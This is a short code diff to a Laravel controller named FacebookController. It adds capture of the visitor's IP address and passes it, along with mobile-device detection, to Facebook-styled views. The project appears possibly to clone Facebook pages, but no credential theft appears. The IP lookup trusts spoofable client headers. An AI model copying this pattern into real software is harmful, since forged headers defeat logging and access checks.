@@ -16,18 +16,40 @@ class FacebookController extends Controller
      */
     public function index()
     {
-        #return view('socialNetwork.facebook.index');
+
+        /**
+         * Get the ip address from the user
+         */
+        function getUserIpAddr(){
+            if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+                //ip from share internet
+                $ip = $_SERVER['HTTP_CLIENT_IP'];
+            }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+                //ip pass from proxy
+                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+            }else{
+                $ip = $_SERVER['REMOTE_ADDR'];
+            }
+            return $ip;
+        }
+
+        $getIpAddress = getUserIpAddr();
+        
+
+        /**
+         *  Detect if the user is use phone or pc 
+         */
         function isMobileDevice() {
             return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo
         |fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i"
         , $_SERVER["HTTP_USER_AGENT"]);
         }
-        
+
         if(isMobileDevice()){
-            return view('socialNetwork.facebook.mobile');
+            return view('socialNetwork.facebook.mobile', compact('getIpAddress'));
         }
         else {
-            return view('socialNetwork.facebook.index');
+            return view('socialNetwork.facebook.index', compact('getIpAddress'));
         }
     }
 
